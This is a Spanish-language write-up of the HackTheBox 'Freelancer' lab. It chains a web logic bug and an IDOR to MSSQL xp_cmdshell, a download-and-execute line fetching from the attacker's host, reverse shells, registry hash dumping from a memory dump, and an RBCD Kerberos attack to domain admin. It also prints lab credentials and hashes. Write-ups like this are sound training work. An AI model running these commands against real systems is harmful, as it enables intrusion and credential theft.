---
title: "Máquina Freelancer"
description: "Resolución de la máquina Freelancer de HackTheBox"
categories: ["HackTheBox", "Hard", "Windows"]
tags: ["Logic bug", "Django", "Stored credentials", "Memory Dump", "RBCD"]
logo: "/assets/writeups/freelancer/logo.webp"
---

Un sitio de trabajadores freelancer tiene varios bugs de lógica en el diseño de su backend, lo cual utilizaremos para entrar en la máquina y tomar control de ella posteriormente.

## Reconocimiento

La máquina tiene varios puertos abiertos, varios de ellos son de Active Directory

```bash
# Nmap 7.94 scan initiated Sat Jun  1 15:04:23 2024 as: nmap -sS -Pn -n -p- --open --min-rate 300 -oN ports -vvv 10.129.250.120
Nmap scan report for 10.129.250.120
Host is up, received user-set (0.42s latency).
Scanned at 2024-06-01 15:04:23 -04 for 627s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49672/tcp open  unknown          syn-ack ttl 127
50662/tcp open  unknown          syn-ack ttl 127
50666/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun  1 15:14:50 2024 -- 1 IP address (1 host up) scanned in 627.18 seconds
```

El sitio web, `freelancer.htb` nos dice que se trata de una página para reclutamiento de empleados freelancers

![Webpage](/assets/writeups/freelancer/1.png)

Podemos ver que hay varios clientes y empleados registrados, así como nosotros podemos registrarnos también... es un sitio funcional casi por completo, y eso interesa por que son varias funciones por explorar

![Vacants](/assets/writeups/freelancer/2.png)

Veamos que hacemos con todo esto.

## Intrusión

### site admin - freelancer.htb

Si nos vamos a la función para reiniciar la contraseña, podemos apreciar esto:

![Password reset](/assets/writeups/freelancer/3.png)

Podemos simplemente dar las preguntas de seguridad y nuestro nombre, lo cual nos reactivará la cuenta y posiblemente nos dará luego un formulario para cambiar la contraseña.

Vale, ahora si vemos el apartado para registrarnos veremos que hay uno para empresarios y otro para freelancers:

![F and E](/assets/writeups/freelancer/4.png)

Si leemos lo que nos dice el de empresarios, notaremos una pequeña incoherencia al instante con lo que vimos antes:

![Employer](/assets/writeups/freelancer/5.png)

Nos dice que la cuenta que crearemos estará desactivada hasta que un staff revise la cuenta y nos envíe por correo un link de activación... pero sabiendo las preguntas de seguridad y otros datos de nuestra cuenta al registrarnos por la propia lógica podemos utilizar la función de reiniciar contraseña para activarla sin que nadie tenga que enviarnos algo.

Registrando la cuenta y luego reiniciándole la contraseña, efectivamente la activará y ahora estaremos como un empresario:

![As employer](/assets/writeups/freelancer/6.png)

Okay... viendo por las funciones que tenemos ahora, podemos generar un código QR para autenticarnos en el sitio sin necesidad de una contraseña:

![QR](/assets/writeups/freelancer/7.png)

Si extraemos el texto del QR, podremos ver que tiene lo siguiente:

```bash
❯ zbarimg --raw freelancer.png 
http://freelancer.htb/accounts/login/otp/MTAwMTE=/a61a8280869b69fd1e946afc06507f53/
```

El base64 en la URL decodificado es `10011`, que es nuestra ID de usuario en el sitio... viendo que no parece tener ningún tipo de validación respecto a la edición de la ID podemos intentar poner la de alguien más.

Viendo quiénes están registrados en el sitio, el usuario con ID `2` y nombre admin se ve interesante, generando un código QR y cambiando la ID en la URL por la de admin nos da acceso como este usuario, como estabamos esperando:

![Admin](/assets/writeups/freelancer/8.png)

### sql_svc - DC (freelancer.htb)

Si nos vamos a la ruta `/admin`, veremos una consola administrativa de Django:

![Django](/assets/writeups/freelancer/9.png)

En la parte de herramientas de desarrollo hay una consola SQL, y rápidamente notaremos que se trata de un SQL Server, en el cual podemos utilizar funciones como `xp_cmdshell` para obtener ejecución de código en la máquina.

Sin embargo, al intentar ir por esto nos dirá que no tenemos suficientes privilegios para usar funciones especiales necesarias para activar dicha función, como `sp_configure`:

```sql
> sp_configure "show advanced options",1
('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]User does not have permission to perform this action. (15247) (SQLExecDirectW)')
```

Pero, MSSQL tiene una instrucción para poder impersornar otros usuarios que es `EXECUTE AS`:

> By default, a session starts when a user logs in and ends when the user logs off. All operations during a session are subject to permission checks against that user. When an EXECUTE AS statement is run, the execution context of the session is switched to the specified login or user name. After the context switch, permissions are checked against the login and user security tokens for that account instead of the person calling the EXECUTE AS statement. In essence, the user or login account is impersonated for the duration of the session or module execution, or the context switch is explicitly reverted.

Si el usuario tiene permisos para hacer esto, podemos impersonar al usuario `sa` y activar el `xp_cmdshell` para posteriormente ejecutarlo. Para probar esto utilizaremos esta serie de instrucciones, dejando un servidor http en escucha antes:

```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1
reconfigure
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;
EXEC xp_cmdshell 'curl -UseBasicParsing http://<ip>:<port>/uwu | IEX';
```

Al hacerlo, el servidor no nos reporta nada pero recibiremos un callback en nuestro servidor http:

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.5 - - [07/Oct/2024 17:32:43] "GET /uwu HTTP/1.1" 200 -
```

Por lo que ya ahora podremos enviarnos una reverse shell colocando en el fichero `uwu` algo como una ConPtyShell.

```bash
❯ rlwrap nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.5 56178
Windows PowerShell Testing 
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>
```

### mikasaAckerman - DC (freelancer.htb)

*Sí, la misma del lugar de [Levi Ackerman](https://shingeki-no-kyojin.fandom.com/es/wiki/Levi_Ackerman) y Eren llega*

En los archivos del usuario `sql_svc` no parece haber mucho, sin embargo en las descargas hay unos residuos del instalador de SQL Server 2019:

```bash
PS C:\Users\sql_svc> PS C:\Users\sql_svc\Downloads> dir


    Directory: C:\Users\sql_svc\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                SQLEXPR-2019_x64_ENU                                                  

```

Viendo los archivos, hay uno llamado `sql-Configuration.INI` editado recientemente, que contiene lo siguiente:

```ini
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
{: file="sql-Configuration.INI" }

Pero la contraseña de la cuenta `sql_svc` no es esta

```bash
❯ nxc smb freelancer.htb -u sql_svc -p 'IL0v3ErenY3ager'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
```

Igualmente, viendo las carpetas que hay en `C:\Users` podemos obtener nombres de usuarios por los que probar y... (sí, se te hará evidentemente que la contraseña es de esa usuaria si conoces ese anime)

```bash
❯ nxc smb freelancer.htb -u userlist.txt -p 'IL0v3ErenY3ager' --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
```

Ya que no es parte del grupo `Remote Management Users`, vamos a tener que usar `RunasCs` para poder acceder como este usuario.

```bash
PS C:\Temp> .\runas.exe mikasaAckerman IL0v3ErenY3ager powershell.exe -r 10.10.14.228:8443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-4d0f5$\Default
[+] Async process 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4016 created in background.
```

```bash
❯ rlwrap nc -lvnp 8443
Listening on 0.0.0.0 8443
Connection received on 10.10.11.5 56316
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
whoami
freelancer\mikasaackerman
```

En el escritorio de esta usuaria podremos encontrar la primera flag.

```bash
PS C:\Users\mikasaAckerman\Desktop> dir


    Directory: C:\Users\mikasaAckerman\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/28/2023   6:23 PM           1468 mail.txt                                                              
-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z                                                             
-ar---        10/7/2024  11:02 AM             34 user.txt                                                              


PS C:\Users\mikasaAckerman\Desktop> type user.txt
type user.txt
82c1a1dd019a9739cea16fff1d******
```

## Escalada de privilegios

### lorra199 - DC (freelancer.htb)

Si vimos lo de arriba, notaremos el mail y el dump de memoria. El mail dice lo siguiente:

> Hello Mikasa,
> I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
> I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
> Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
> Best regards,

Nos dice que el archivo 7z es un dump de toda la memoria en el equipo `DATACENTER-2019`... veamos que hacemos con esto ya que se muy interesante.

Al extraerlo, podemos ver que además de ser muy pesado, se trata de un archivo con un crash dump completo

```bash
❯ file MEMORY.DMP 
MEMORY.DMP: MS Windows 64bit crash dump, version 15.17763, 2 processors, full dump, 4992030524978970960 pages
```

Hay varias formas de poder ver la memoria de procesos como el LSASS o de las Hives del registro; tienes la utilidad [memprocfs](https://github.com/ufrisk/MemProcFS) o utilizar la extensión propia de Mimikatz para el debugger de Windows WinDbg. Yo utilizaré la primera:

```bash
❯ memprocfs -device MEMORY.DMP -mount mount
Initialized 64-bit Windows 10.0.17763
[PLUGIN]   Python plugin manager failed to load.

==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net                      
 - Info:             https://github.com/ufrisk/MemProcFS                 
 - Discord:          https://discord.gg/pcileech                         
 - License:          GNU Affero General Public License v3.0              
   --------------------------------------------------------------------- 
   MemProcFS is free open source software. If you find it useful please  
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)  
   --------------------------------------------------------------------- 
 - Version:          5.9.16 (Linux)
 - Mount Point:      mount           
 - Tag:              17763_a3431de6        
 - Operating System: Windows 10.0.17763 (X64)
==========================================================================

[SYMBOL]   Functionality may be limited. Extended debug information disabled.
[SYMBOL]   Partial offline fallback symbols in use.
[SYMBOL]   For additional information use startup option: -loglevel symbol:4
[SYMBOL]   Reason: Unable to download kernel symbols to cache from Symbol Server.

```

Al ejecutarlo, en la carpeta `mount` podremos acceder a la memoria del dump en forma de archivos.

```bash
❯ ls -al
total 4
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:26 .
drwxr-xr-x 3 vzon vzon       4096 Oct  7 21:22 ..
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 conf
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 forensic
-rw-r--r-- 1 vzon vzon 1782325248 Oct  7 21:22 memory.dmp
-rw-r--r-- 1 vzon vzon 1782317056 Oct  7 21:22 memory.pmem
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 misc
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 name
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 pid
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 registry
drwxr-xr-x 2 vzon vzon          0 Oct  7 21:22 sys
```

De particular interés es la carpeta `registry`, ya que contiene los hives del registro, justo con SYSTEM, SAM y SECURITY:

```bash
❯ ls -al
drwxr-xr-x vzon vzon   0 B  Mon Oct  7 21:22:22 2024 .
drwxr-xr-x vzon vzon   0 B  Mon Oct  7 21:22:22 2024 ..
.rw-r--r-- vzon vzon 8.0 KB Mon Oct  7 21:22:22 2024 0xffffd30679c0e000-unknown-unknown.reghive
.rw-r--r-- vzon vzon  18 MB Mon Oct  7 21:22:22 2024 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive
.rw-r--r-- vzon vzon  28 KB Mon Oct  7 21:22:22 2024 0xffffd30679cdc000-unknown-MACHINE_HARDWARE.reghive
.rw-r--r-- vzon vzon 8.0 KB Mon Oct  7 21:22:22 2024 0xffffd3067b257000-settingsdat-A_{c94cb844-4804-8507-e708-439a8873b610}.reghive
.rw-r--r-- vzon vzon 316 KB Mon Oct  7 21:22:22 2024 0xffffd3067b261000-ActivationStoredat-A_{23F7AFEB-1A41-4BD7-9168-EA663F1D9A7D}.reghive
.rw-r--r-- vzon vzon  28 KB Mon Oct  7 21:22:22 2024 0xffffd3067b514000-BCD-MACHINE_BCD00000000.reghive
.rw-r--r-- vzon vzon  87 MB Mon Oct  7 21:22:22 2024 0xffffd3067b516000-SOFTWARE-MACHINE_SOFTWARE.reghive
.rw-r--r-- vzon vzon 312 KB Mon Oct  7 21:22:22 2024 0xffffd3067d7e9000-DEFAULT-USER_.DEFAULT.reghive
.rw-r--r-- vzon vzon  48 KB Mon Oct  7 21:22:22 2024 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive
.rw-r--r-- vzon vzon  48 KB Mon Oct  7 21:22:22 2024 0xffffd3067d935000-SAM-MACHINE_SAM.reghive
... [snip]
```

Al pasársela a `secretsdump.py` para ver si hay alguna contraseña guardada que se reutiliza o al menos su hash NTLM, veremos que hay algo curioso:

```bash
❯ secretsdump.py -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive LOCAL
Impacket v0.12.0.dev1+20240411.142706.1bc283f - Copyright 2023 Fortra

[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
[*] NL$KM 
 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.
 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c 
NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
[*] _SC_MSSQL$DATA 
(Unknown User):PWN3D#l0rr@Armessa199
[*] Cleaning up... 
```

Esta contraseña es reutilizada por la usuaria `lorra199`:

```bash
❯ nxc smb freelancer.htb -u userlist.txt -p 'PWN3D#l0rr@Armessa199' --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\mikasaAckerman:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sqlbackupoperator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
```

Esta usuaria posee privilegios para acceder remotamente por WinRM, asi que ya podremos entrar sin problemas utilizando `evil_winrm`:

```bash
PS C:\Users\mikasaAckerman\Desktop> net user lorra199
net user lorra199
User name                    lorra199
Full Name                    
Comment                      IT Support Technician
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/4/2023 8:19:14 AM
Password expires             Never
Password changeable          10/5/2023 8:19:14 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/13/2024 11:12:56 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *AD Recycle Bin       
The command completed successfully.
```

### Administrator - DC (freelancer.htb)

Utilizando bloodhound para ver los permisos de esta usuaria, podremos notar algo que llama potencialmente la atención:

![GenericWrite](/assets/writeups/freelancer/10.png)

Vaya pues... prácticamente tenemos GenericWrite sobre casi todo xd.

Eso nos da privilegios para editar atributos no privilegiados, y entre todos esos objetos está el de la máquina DC que bien sabemos, nos permitará hacer un ataque de RBCD.

Primero agregemos una nueva computadora al equipo

```bash
❯ addcomputer.py -computer-name 'uwuowo$' -dc-host freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1+20240411.142706.1bc283f - Copyright 2023 Fortra

[*] Successfully added machine account uwuawa$ with password yXDsT1TaUe0ipLAfOLON09g53J4ZFkHF.
```

Luego, escribiremos en la propiedad `msDS-AllowedToActOnBehalfOfOtherIdentity` de `DC$` el nombre de la cuenta de equipo que acabamos de crear.

```bash
❯ rbcd.py -delegate-to 'DC$' -delegate-from 'uwuowo$' -action write 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1+20240411.142706.1bc283f - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] uwuowo$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     uwuowo$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

Ahora finalmente podemos obtener un ticket como Administrador, impersonandolo desde `uwuowo$`:

```bash
❯ getTGT.py 'freelancer.htb/uwuowo$:yXDsT1TaUe0ipLAfOLON09g53J4ZFkHF'
Impacket v0.12.0.dev1+20240411.142706.1bc283f - Copyright 2023 Fortra

[*] Saving ticket in uwuowo$.ccache
❯ export KRB5CCNAME=uwuowo$.ccache
❯ getST.py -impersonate Administrator -spn 'cifs/DC.freelancer.htb' -k -no-pass 'freelancer.htb/uwuowo$'
Impacket v0.12.0.dev1+20240411.142706.1bc283f - Copyright 2023 Fortra

[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Podemos acceder al SMB como administrador con este ticket, por lo que vamos a tomar el hash NTLM de este

```bash
❯ nxc smb dc.freelancer.htb -k --use-kcache -u Administrator --ntds --user Administrator
SMB         dc.freelancer.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         dc.freelancer.htb 445    DC               [+] freelancer.htb\Administrator from ccache (Pwn3d!)
SMB         dc.freelancer.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.freelancer.htb 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
```

Accediendo por WinRM ya podremos encontrar la última flag en el escritorio.

```bash
❯ evil-winrm -i freelancer.htb -u Administrator -H '0039318f1e8274633445bce32ad1a290'
                                        
Evil-WinRM shell v3.6
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/8/2024  11:45 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4f7ba07d930933cba4ff25851b******
```

## Extra

Se me hizo chistoso que algunos de los nombres de usuarios de la máquina sean de personajes ficticios. Incluso en la propia web de Freelancer te puedes encontrar un perfil llamado "Itachi Uchiha".